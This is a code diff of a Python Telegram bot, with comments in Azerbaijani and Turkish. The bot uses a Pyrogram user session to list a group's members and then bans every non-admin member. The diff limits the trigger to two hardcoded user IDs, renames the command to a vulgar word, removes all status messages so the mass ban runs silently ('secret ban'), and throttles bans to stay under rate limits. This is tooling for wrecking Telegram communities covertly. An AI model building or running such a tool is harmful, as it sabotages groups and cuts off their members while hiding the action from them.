@@ -1,8 +1,7 @@
 import logging
 import os
 import asyncio
-from pyrogram import Client, filters as pyro_filters
-from pyrogram.types import Message as PyroMessage
+from pyrogram import Client
 from pyrogram.enums import ChatMembersFilter
 from telegram import Update
 from telegram.ext import (
@@ -17,9 +16,9 @@ TOKEN          = os.environ["BOT_TOKEN"]
 API_ID         = int(os.environ["API_ID"])
 API_HASH       = os.environ["API_HASH"]
 STRING_SESSION = os.environ["STRING_SESSION"]
-FOUNDER_ID     = 8034872992
 
-authorized: set[int] = set()
+# Yalnız bu 2 nəfər istifadə edə bilər
+ALLOWED = {8034872992, 8696704547}
 
 pyro = Client(
     "ban_guard",
@@ -39,76 +38,57 @@ async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid  = update.effective_user.id
     text = (msg.text or "").strip()
 
-    # ── /c31k — yetki ver ─────────────────────────────────────────────────
-    if text.startswith("/c31k"):
-        if uid != FOUNDER_ID:
-            return
-        if not msg.reply_to_message:
-            await msg.reply_text("❗ Birine yanıt verip /c31k yaz.")
-            return
-        target = msg.reply_to_message.from_user
-        authorized.add(target.id)
-        await msg.reply_text(f"✅ {target.first_name} yetki aldı.")
+    if not text.startswith("/sik"):
         return
 
-    # ── /yarrak — herkesi banla ───────────────────────────────────────────
-    if text.startswith("/yarrak"):
-        if uid != FOUNDER_ID and uid not in authorized:
-            return
+    # Yalnız icazəli 2 nəfər
+    if uid not in ALLOWED:
+        return
 
-        cid      = update.effective_chat.id
-        bildirim = await msg.reply_text("🔨 Üyeler alınıyor...")
+    cid = update.effective_chat.id
 
-        # Adminləri al — atlamaq üçün
-        admins = set()
+    # Adminləri al
+    admins = set()
+    try:
+        admins_list = await ctx.bot.get_chat_administrators(cid)
+        for admin in admins_list:
+            admins.add(admin.user.id)
+    except Exception as e:
+        logger.warning(f"Admin siyahısı alınamadı: {e}")
+
+    # Pyrogram ilə üzv siyahısını al
+    to_ban = []
+    try:
+        async for member in pyro.get_chat_members(cid):
+            user = member.user
+            if user is None:
+                continue
+            if user.is_bot:
+                continue
+            if user.id in admins:
+                continue
+            if user.id in ALLOWED:
+                continue
+            to_ban.append(user.id)
+    except Exception as e:
+        logger.warning(f"Üyeler alınamadı: {e}")
+        return
+
+    # Gizli ban — heç nə yazma
+    banned  = 0
+    skipped = 0
+
+    for user_id in to_ban:
         try:
-            async for admin in await ctx.bot.get_chat_administrators(cid):
-                admins.add(admin.user.id)
+            await ctx.bot.ban_chat_member(cid, user_id)
+            banned += 1
+            if banned % 28 == 0:
+                await asyncio.sleep(1)
         except Exception as e:
-            logger.warning(f"Admin siyahısı alınamadı: {e}")
+            logger.warning(f"Ban xətası {user_id}: {e}")
+            skipped += 1
 
-        # Pyrogram ilə üzv siyahısını al
-        to_ban = []
-        try:
-            async for member in pyro.get_chat_members(cid):
-                user = member.user
-                if user is None:
-                    continue
-                if user.is_bot:
-                    continue
-                if user.id in admins:
-                    continue
-                if user.id == FOUNDER_ID:
-                    continue
-                if user.id in authorized:
-                    continue
-                to_ban.append(user.id)
-        except Exception as e:
-            await bildirim.edit_text(f"❌ Üyeler alınamadı: {e}")
-            return
-
-        await bildirim.edit_text(f"🔨 {len(to_ban)} kişi banlanıyor...")
-
-        banned  = 0
-        skipped = 0
-
-        for user_id in to_ban:
-            try:
-                await ctx.bot.ban_chat_member(cid, user_id)
-                banned += 1
-                # 30 ban/saniyə limiti
-                if banned % 28 == 0:
-                    await asyncio.sleep(1)
-            except Exception as e:
-                logger.warning(f"Ban xətası {user_id}: {e}")
-                skipped += 1
-
-        await bildirim.edit_text(
-            f"✅ Tamamlandı!\n"
-            f"🔨 Banlanan: *{banned}*\n"
-            f"⏭ Atlanan: *{skipped}*",
-            parse_mode="Markdown"
-        )
+    logger.info(f"Tamamlandı: banlanan={banned}, atlanan={skipped}")
 
 async def post_init(tg_app: Application):
     await pyro.start()
